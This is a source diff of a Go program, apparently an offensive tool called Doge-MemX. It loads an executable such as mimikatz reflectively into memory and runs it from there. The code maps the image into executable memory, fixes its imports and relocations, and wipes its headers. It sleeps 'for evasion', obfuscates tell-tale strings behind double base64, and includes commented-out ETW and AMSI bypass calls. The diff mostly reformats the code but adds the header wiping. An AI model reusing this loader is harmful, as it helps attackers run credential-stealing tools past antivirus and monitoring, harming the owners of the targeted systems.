@@ -20,13 +20,13 @@ var Argsfunc []args.ArgsFunc
 var SysArgs []string
 
 //fix ImportAddressTable
-func fixImportAddressTable(baseAddress uintptr){
+func fixImportAddressTable(baseAddress uintptr) {
 	fmt.Println("[+] IAT Fix starts...")
 
 	ntHeader := lib.NtH(baseAddress)
 	iatDirectory := &ntHeader.OptionalHeader.DataDirectory[lib.IMAGE_DIRECTORY_ENTRY_IMPORT]
 
-	if iatDirectory.VirtualAddress ==0 {
+	if iatDirectory.VirtualAddress == 0 {
 		fmt.Println("[!] Import Table not found")
 		return
 	}
@@ -36,17 +36,17 @@ func fixImportAddressTable(baseAddress uintptr){
 	var ITEntryCursor *lib.IMAGE_IMPORT_DESCRIPTOR = nil
 	parsedSize := uintptr(0)
 
-	for ;parsedSize<uintptr(iatSize);parsedSize+=unsafe.Sizeof(lib.IMAGE_IMPORT_DESCRIPTOR{}) {
-		ITEntryCursor = (*lib.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(uintptr(iatRVA)+uintptr(baseAddress)+parsedSize))
-		if ITEntryCursor.OriginalFirstThunk == 0 && ITEntryCursor.FirstThunk == 0{
+	for ; parsedSize < uintptr(iatSize); parsedSize += unsafe.Sizeof(lib.IMAGE_IMPORT_DESCRIPTOR{}) {
+		ITEntryCursor = (*lib.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(uintptr(iatRVA) + uintptr(baseAddress) + parsedSize))
+		if ITEntryCursor.OriginalFirstThunk == 0 && ITEntryCursor.FirstThunk == 0 {
 			break
 		}
 
-		ptrLibraryName := unsafe.Pointer(uintptr(baseAddress)+uintptr(ITEntryCursor.Name))
+		ptrLibraryName := unsafe.Pointer(uintptr(baseAddress) + uintptr(ITEntryCursor.Name))
 		libraryName := lib.CstrVal(unsafe.Pointer(ptrLibraryName))
 		dllName := string(libraryName[:])
 
-		fmt.Println("[+] Imported DLL Name: "+dllName)
+		fmt.Println("[+] Imported DLL Name: " + dllName)
 
 		//Address
 		firstThunkRVA := ITEntryCursor.FirstThunk
@@ -58,11 +58,11 @@ func fixImportAddressTable(baseAddress uintptr){
 		cursorFirstThunk := uintptr(0)
 		cursorOriginalFirstThunk := uintptr(0)
 		for {
-			firstThunkData := (*lib.ImageThunkData)(unsafe.Pointer(baseAddress+cursorFirstThunk+uintptr(firstThunkRVA)))
-			originalFirstThunkData := (*lib.OriginalImageThunkData)(unsafe.Pointer(baseAddress+ cursorOriginalFirstThunk +uintptr(originalFirstThunkRVA)))
+			firstThunkData := (*lib.ImageThunkData)(unsafe.Pointer(baseAddress + cursorFirstThunk + uintptr(firstThunkRVA)))
+			originalFirstThunkData := (*lib.OriginalImageThunkData)(unsafe.Pointer(baseAddress + cursorOriginalFirstThunk + uintptr(originalFirstThunkRVA)))
 
 			//from reflect-pe
-			if firstThunkData.AddressOfData == 0{
+			if firstThunkData.AddressOfData == 0 {
 				//end of the list
 				break
 			}
@@ -78,24 +78,22 @@ func fixImportAddressTable(baseAddress uintptr){
 				//fmt.Println(" [+] Import by name: "+funcName)
 			}
 
-			dllAddr,_ := syscall.LoadLibrary(dllName)
+			dllAddr, _ := syscall.LoadLibrary(dllName)
 
 			var err error
-			functionAddr , err = lib.GetProcAddress(unsafe.Pointer(dllAddr), ptrName)
+			functionAddr, err = lib.GetProcAddress(unsafe.Pointer(dllAddr), ptrName)
 			if err != nil {
 				return
 			}
 
-
-
 			//arguments functions
-			if lib.Contains(args.Argfunc,funcName){
-				fmt.Println("get Args func: "+ funcName)
+			if lib.Contains(args.Argfunc, funcName) {
+				fmt.Println("get Args func: " + funcName)
 				tmpfunc := args.ArgsFunc{
-					Name: funcName,
+					Name:    funcName,
 					Address: functionAddr,
 				}
-				Argsfunc = append(Argsfunc,tmpfunc)
+				Argsfunc = append(Argsfunc, tmpfunc)
 			}
 
 			firstThunkData.AddressOfData = functionAddr
@@ -107,42 +105,41 @@ func fixImportAddressTable(baseAddress uintptr){
 	}
 }
 
-func str1(a string)string{
+func str1(a string) string {
 	return a
 }
 
 //fix relocTable
-func fixRelocTable(loadedAddr uintptr, perferableAddr uintptr, relocDir *lib.IMAGE_DATA_DIRECTORY){
+func fixRelocTable(loadedAddr uintptr, perferableAddr uintptr, relocDir *lib.IMAGE_DATA_DIRECTORY) {
 	maxSizeOfDir := relocDir.Size
 	relocBlocks := relocDir.VirtualAddress
 	var relocBlockMetadata *lib.IMAGE_BASE_RELOCATION
 
 	relocBlockOffset := uintptr(0)
-	for ; relocBlockOffset < uintptr(maxSizeOfDir); relocBlockOffset += uintptr(relocBlockMetadata.SizeOfBlock){
-		relocBlockMetadata = (*lib.IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocBlocks)+relocBlockOffset+loadedAddr))
-		if relocBlockMetadata.VirtualAddress == 0 || relocBlockMetadata.SizeOfBlock == 0{
+	for ; relocBlockOffset < uintptr(maxSizeOfDir); relocBlockOffset += uintptr(relocBlockMetadata.SizeOfBlock) {
+		relocBlockMetadata = (*lib.IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocBlocks) + relocBlockOffset + loadedAddr))
+		if relocBlockMetadata.VirtualAddress == 0 || relocBlockMetadata.SizeOfBlock == 0 {
 			break
 		}
 		entriesNum := (uintptr(relocBlockMetadata.SizeOfBlock) - unsafe.Sizeof(lib.IMAGE_BASE_RELOCATION{})) / unsafe.Sizeof(lib.ImageReloc{})
 		pageStart := relocBlockMetadata.VirtualAddress
-		relocEntryCursor := (*lib.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocBlockMetadata))+unsafe.Sizeof(lib.IMAGE_BASE_RELOCATION{})))
+		relocEntryCursor := (*lib.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocBlockMetadata)) + unsafe.Sizeof(lib.IMAGE_BASE_RELOCATION{})))
 
-		for i := 0; i<int(entriesNum);i++{
-			if relocEntryCursor.GetType() == 0{
+		for i := 0; i < int(entriesNum); i++ {
+			if relocEntryCursor.GetType() == 0 {
 				continue
 			}
 
-			relocationAddr := uintptr(pageStart) + uintptr(loadedAddr)+uintptr(relocEntryCursor.GetOffset())
+			relocationAddr := uintptr(pageStart) + uintptr(loadedAddr) + uintptr(relocEntryCursor.GetOffset())
 			relocationAddr = uintptr((unsafe.Pointer(relocationAddr))) + loadedAddr - perferableAddr
-			relocEntryCursor = (*lib.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor))+unsafe.Sizeof(lib.ImageReloc{})))
+			relocEntryCursor = (*lib.ImageReloc)(unsafe.Pointer(uintptr(unsafe.Pointer(relocEntryCursor)) + unsafe.Sizeof(lib.ImageReloc{})))
 		}
 
 	}
-	if relocBlockOffset == 0{
+	if relocBlockOffset == 0 {
 		fmt.Println("[!] There is a problem in relocation directory")
 	}
 }
-
 
 // CopySections - writes the sections of a PE image to the given base address in memory
 func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
@@ -190,31 +187,30 @@ func CopySections(pefile *pe.File, image *[]byte, loc uintptr) error {
 	return nil
 }
 
-
-func peLoader(bytes0 *[]byte,funcExec string){
+func peLoader(bytes0 *[]byte, funcExec string) {
 	baseAddr := *(*uintptr)(unsafe.Pointer(bytes0))
 	tgtFile := lib.NtH(baseAddr)
 
-	peF,_ := pe.NewFile(bytes.NewReader(*bytes0))
+	peF, _ := pe.NewFile(bytes.NewReader(*bytes0))
 	relocTable := lib.GetRelocTable(tgtFile)
 
 	preferableAddress := tgtFile.OptionalHeader.ImageBase
 
-	ntdllHandler,_ := syscall.LoadLibrary("ntdll.dll")
-	NtUnmapViewOfSection,_ := syscall.GetProcAddress(ntdllHandler,"NtUnmapViewOfSection")
-	syscall.Syscall(NtUnmapViewOfSection,2,uintptr(0xffffffffffffffff),uintptr(tgtFile.OptionalHeader.ImageBase),0)
+	ntdllHandler, _ := syscall.LoadLibrary("ntdll.dll")
+	NtUnmapViewOfSection, _ := syscall.GetProcAddress(ntdllHandler, "NtUnmapViewOfSection")
+	syscall.Syscall(NtUnmapViewOfSection, 2, uintptr(0xffffffffffffffff), uintptr(tgtFile.OptionalHeader.ImageBase), 0)
 
-	imageBaseForPE,_ := windows.VirtualAlloc(uintptr(preferableAddress),uintptr(tgtFile.OptionalHeader.SizeOfImage),0x00001000|0x00002000,windows.PAGE_EXECUTE_READWRITE)
+	imageBaseForPE, _ := windows.VirtualAlloc(uintptr(preferableAddress), uintptr(tgtFile.OptionalHeader.SizeOfImage), 0x00001000|0x00002000, windows.PAGE_EXECUTE_READWRITE)
 
-	if imageBaseForPE == 0 && relocTable == nil{
+	if imageBaseForPE == 0 && relocTable == nil {
 		fmt.Println("[!] No Relocation Table and Cannot load to the preferable address")
 		return
 	}
-	if imageBaseForPE == 0 && relocTable != nil{
+	if imageBaseForPE == 0 && relocTable != nil {
 		fmt.Println("[+] Cannot load to the preferable address")
-		imageBaseForPE,_ = windows.VirtualAlloc(0,uintptr(tgtFile.OptionalHeader.SizeOfImage),0x00001000|0x00002000,windows.PAGE_EXECUTE_READWRITE)
+		imageBaseForPE, _ = windows.VirtualAlloc(0, uintptr(tgtFile.OptionalHeader.SizeOfImage), 0x00001000|0x00002000, windows.PAGE_EXECUTE_READWRITE)
 
-		if imageBaseForPE == 0{
+		if imageBaseForPE == 0 {
 			fmt.Println("[!] Cannot allocate the memory")
 			return
 		}
@@ -223,25 +219,25 @@ func peLoader(bytes0 *[]byte,funcExec string){
 	tgtFile.OptionalHeader.ImageBase = (lib.ULONGLONG)(imageBaseForPE)
 
 	//copy headers
-	lib.Memcpy(baseAddr,imageBaseForPE,uintptr(tgtFile.OptionalHeader.SizeOfHeaders))
+	lib.Memcpy(baseAddr, imageBaseForPE, uintptr(tgtFile.OptionalHeader.SizeOfHeaders))
 
 	fmt.Println("[+] All headers are copied")
 
 	//copy section from *pe.File
-	CopySections(peF,bytes0,imageBaseForPE)
+	CopySections(peF, bytes0, imageBaseForPE)
 
 	fmt.Println("[+] All sections are copied")
 
 	fixImportAddressTable(imageBaseForPE)
 
-	if imageBaseForPE != uintptr(preferableAddress){
-		if relocTable != nil{
-			fixRelocTable(imageBaseForPE,uintptr(preferableAddress),(*lib.IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable)))
-		}else{
+	if imageBaseForPE != uintptr(preferableAddress) {
+		if relocTable != nil {
+			fixRelocTable(imageBaseForPE, uintptr(preferableAddress), (*lib.IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable)))
+		} else {
 			fmt.Println("[!] No Reloc Table Found")
 		}
 	}
-	startAddress := imageBaseForPE+uintptr(tgtFile.OptionalHeader.AddressOfEntryPoint)
+	startAddress := imageBaseForPE + uintptr(tgtFile.OptionalHeader.AddressOfEntryPoint)
 
 	//fix arguments
 	for _, function := range Argsfunc {
@@ -250,27 +246,30 @@ func peLoader(bytes0 *[]byte,funcExec string){
 			injectorFunc(function.Address, SysArgs)
 		}
 	}
-	mz := []byte("EX")
-	lib.Memcpy(uintptr(unsafe.Pointer(&mz[0])),imageBaseForPE,uintptr(len(mz)))
+	//mz := []byte("EX")
+	//lib.Memcpy(uintptr(unsafe.Pointer(&mz[0])), imageBaseForPE, uintptr(len(mz)))
+	lib.Memset(baseAddr, 0, uintptr(tgtFile.OptionalHeader.SizeOfImage))
+	lib.Memset(imageBaseForPE, 0, unsafe.Sizeof(lib.IMAGE_DOS_HEADER{})+unsafe.Sizeof(lib.IMAGE_NT_HEADERS{}))
+
 	fmt.Println("[+] Binary is running")
 
-	exec(startAddress,funcExec)
+	exec(startAddress, funcExec)
 	//syscall.Syscall(startAddress,0,0,0,0)
 }
 
-func exec(startA uintptr,funcExec string){
+func exec(startA uintptr, funcExec string) {
 	switch funcExec {
 	case "syscall":
 		fmt.Println("Sleep 20s for evasion...")
-		go func(){
-			for i := 0; i < 100 ;i++{
+		go func() {
+			for i := 0; i < 100; i++ {
 				fmt.Println("Sleep 20s for evasion...")
-				windows.SleepEx(100,false)
+				windows.SleepEx(100, false)
 			}
 		}()
-		windows.SleepEx(20000,false)
+		windows.SleepEx(20000, false)
 
-		syscall.Syscall(startA,0,0,0,0)
+		syscall.Syscall(startA, 0, 0, 0, 0)
 
 	case "createthread":
 		createThread := syscall.NewLazyDLL("kernel32").NewProc("CreateThread")
@@ -285,16 +284,16 @@ func exec(startA uintptr,funcExec string){
 			uintptr(0x00000004),
 			uintptr(0))
 		if err != syscall.Errno(0) {
-			exec(startA,"syscall")
-		}else{
+			exec(startA, "syscall")
+		} else {
 			fmt.Println("Sleep 20s for evasion...")
-			go func(){
-				for i := 0; i < 100 ;i++{
+			go func() {
+				for i := 0; i < 100; i++ {
 					fmt.Println("Sleep 20s for evasion...")
-					windows.SleepEx(100,false)
+					windows.SleepEx(100, false)
 				}
 			}()
-			windows.SleepEx(20000,false)
+			windows.SleepEx(20000, false)
 
 			fmt.Println("ResumeThread...")
 			_, _, err = resumeThread.Call(r1)
@@ -314,34 +313,33 @@ func exec(startA uintptr,funcExec string){
 	}
 }
 
-
-func main(){
+func main() {
 	//lib.ByETW()
 	//lib.ByAMSI()
 	var shellcode []byte
-	if len(os.Args)!= 2||os.Args[1] == "-h"{
+	if len(os.Args) != 2 || os.Args[1] == "-h" {
 		fmt.Println("Usage:")
 		fmt.Println("	Doge-MemX.exe mimikatz.exe\n")
 		fmt.Println("	Doge-MemX.exe mimikatz.zip\n")
 		os.Exit(1)
 	}
 	fileObj, err := os.Open(os.Args[1])
-	if err != nil{
+	if err != nil {
 		panic(err)
 	}
 
 	shellcode, err = ioutil.ReadAll(fileObj)
-	if err != nil{
+	if err != nil {
 		panic(err)
 	}
 
 	//支持从zip压缩包读取exe
-	if strings.Contains(os.Args[1],".zip"){
-		shellcode,err = lib.ReadZipFile(shellcode)
-		if err != nil{
+	if strings.Contains(os.Args[1], ".zip") {
+		shellcode, err = lib.ReadZipFile(shellcode)
+		if err != nil {
 			panic(err)
 		}
-		if shellcode == nil{
+		if shellcode == nil {
 			panic(fmt.Errorf("fail to read zip"))
 		}
 	}
@@ -396,16 +394,16 @@ func main(){
 		lib.DecodeB64(lib.DecodeB64("SnlNakl5TWpKdz09")),
 		lib.DecodeB64(lib.DecodeB64("VkdocGN5QndjbTluY21GdElHTmhibTV2ZENCaVpTQnlkVzRnYVc0Z1JFOVRJRzF2WkdVPQ==")),
 	}
-	shellcode = lib.ObfuscateStrings(shellcode,blacklist)
+	shellcode = lib.ObfuscateStrings(shellcode, blacklist)
 
 	SysArgs = append(SysArgs, os.Args[0])
 
 	//run args
 	tmpArgs := []string{"coffee"}
-	for i,_ := range tmpArgs{
-		SysArgs = append(SysArgs,tmpArgs[i])
+	for i, _ := range tmpArgs {
+		SysArgs = append(SysArgs, tmpArgs[i])
 	}
 
-	peLoader(&shellcode,"createthread")
-	//peLoader(&shellcode,"syscall")
+	//peLoader(&shellcode,"createthread")
+	peLoader(&shellcode, "syscall")
 }
